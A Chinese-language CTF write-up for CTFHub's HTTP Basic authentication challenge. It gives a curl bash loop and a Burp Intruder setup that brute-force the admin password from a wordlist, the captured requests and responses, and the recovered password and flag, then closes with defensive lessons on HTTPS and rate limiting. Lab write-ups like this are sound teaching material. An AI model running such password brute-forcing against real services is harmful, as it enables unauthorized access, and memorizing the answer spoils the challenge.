# WP：基础认证

> **CTFHub 路径**：技能树 → Web → Web 前置技能 → HTTP 协议 → 基础认证>   
> **任务**：破解 HTTP Basic 认证，拿到 flag。>   
> **提示**：观察 `401 Unauthorized` 响应和 `WWW-Authenticate: Basic` 响应头。Basic 认证把 `用户名:密码` 做 Base64 编码后放在 `Authorization` 请求头里，Base64 不是加密。>   
> **截图要求**：能看到 `Authorization: Basic ...` 请求头，以及认证成功后的 flag 或页面。

---

## 题目信息

| 项目   | 内容                                                           |
| ---- | ------------------------------------------------------------ |
| 环境地址 | <http://challenge-e50807acf7ccf128.sandbox.ctfhub.com:10800> |
| 用户名  | admin                                                        |
| 密码   | zxcvbnm（题目附件字典第 41 条）                                        |
| Flag | ctfhub{06e0e404e8d7c2f51ef95016}                             |

## 解题过程

打开环境，首页 `GET /` 返回的是一个很朴素的页面，正文只有 `CTFHub 基础认证` 和一个链接 `Here is your flag: <a href="/flag.html">click</a>` —— 说明 flag 放在 `/flag.html`，首页本身不需要任何凭证。

直接请求 `/flag.html`：

```bash
curl -i http://challenge-e50807acf7ccf128.sandbox.ctfhub.com:10800/flag.html
```

返回 `401 Unauthorized`，响应头里有一行 `WWW-Authenticate: Basic realm="Do u know admin ?"`。这一行就是浏览器弹出原生登录框的原因，同时 realm 里的提示也把用户名交代了：`admin`。也就是说缺的只有密码。

题目页另外给了一个附件，解压后是 `10_million_password_list_top_100.txt`，一行一个常见弱口令，共 100 条。先确认编码格式：`printf 'admin:123456' | base64` 得到 `YWRtaW46MTIzNDU2`，与抓包里 `Authorization: Basic YWRtaW46MTIzNDU2` 完全对上，于是确认了规则是 `Basic Base64(用户名:密码)`，冒号是英文冒号。

接下来用字典逐条试。`curl` 的 `-u` 参数会自动完成拼装和 Base64 编码，所以只需要看状态码是不是从 `401` 变成了 `200`：

```bash
URL="http://challenge-e50807acf7ccf128.sandbox.ctfhub.com:10800/flag.html"
while IFS= read -r p; do
  code=$(curl -s -o /tmp/b.html -w '%{http_code}' -u "admin:$p" "$URL")
  if [ "$code" = "200" ]; then echo "HIT: admin:$p"; cat /tmp/b.html; break; fi
done < 10_million_password_list_top_100.txt
```

跑到第 41 条时命中：`admin:zxcvbnm`，`Content-Length: 33`，响应体就是 flag。

同样的结果用 Burp 也能做：把那条请求 Send to Intruder，payload 位置圈住 `Basic ` 后面整串 Base64，先用 `while read -r p; do printf 'admin:%s' "$p" | base64 -w0; echo; done < 字典 > b64.txt` 把字典预编码成 payload 列表，再关掉 `URL-encode these characters`（否则末尾的 `=` 会变成 `%3D`），攻击开始后按 Status 排序找 `200`。

最后用 `curl -v -u admin:zxcvbnm` 复现了一次，`-v` 把实际发出的请求头打了出来，确认服务端收的就是 `Authorization: Basic YWRtaW46enhjdmJubQ==`。

## 关键请求/响应

```http
# 1) 不给凭证，直接访问受保护页面
GET /flag.html HTTP/1.1
Host: challenge-e50807acf7ccf128.sandbox.ctfhub.com:10800

HTTP/1.1 401 Unauthorized
Server: openresty/1.21.4.2
Date: Sat, 24 Oct 2026 12:56:08 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 179
Connection: keep-alive
WWW-Authenticate: Basic realm="Do u know admin ?"

<html>
<head><title>401 Authorization Required</title></head>
<body>
<center><h1>401 Authorization Required</h1></center>
<hr><center>nginx/1.16.1</center>
</body>
</html>
```

```http
# 2) 字典第 41 条命中，认证成功
GET /flag.html HTTP/1.1
Host: challenge-e50807acf7ccf128.sandbox.ctfhub.com:10800
Authorization: Basic YWRtaW46enhjdmJubQ==
User-Agent: curl/8.20.0
Accept: */*

HTTP/1.1 200 OK
Server: openresty/1.21.4.2
Date: Sat, 24 Oct 2026 13:01:11 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 33
Connection: keep-alive
Last-Modified: Sat, 24 Oct 2026 12:30:26 GMT
ETag: "6adca4e2-21"
Accept-Ranges: bytes
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-Requested-With
Access-Control-Allow-Methods: *

ctfhub{06e0e404e8d7c2f51ef95016}
```



> `YWRtaW46enhjdmJubQ==` 解码就是 `admin:zxcvbnm`。整条响应体只有 33 字节，正好是 flag 的长度，说明成功页面连 HTML 外壳都没有。

## 原理与复盘

Basic 认证的位置在**请求头 `Authorization`**：客户端把 `用户名:密码` 用英文冒号拼起来，做一次 Base64 编码，前面加 `Basic ` 再放进这个头；校验失败时服务端返回 `401 Unauthorized`，并用 `WWW-Authenticate: Basic realm="..."` 告诉浏览器该弹框。

这题有两个致命点：

1. **Base64 只是编码不是加密**。抓一次包就能把口令还原成明文，中间人直接拿到账号密码；
2. **服务端没有失败次数限制**。`401` 一直照常返回，100 条字典几十秒就跑完了，第 41 条就是 `zxcvbnm` 这种键盘顺序弱口令。

复盘的结论：Basic 认证必须跑在 HTTPS 上，并且要有登录频控和账号锁定；口令强度比认证方式更容易被突破，`zxcvbnm` 这类键盘串在任何字典里都排得很靠前。

---

## 截图

![基础认证](../imgs/lab5_basic_auth.png)

> 截图里同时能看到请求行、`Authorization: Basic YWRtaW46enhjdmJubQ==`、`200 OK` 和 flag。
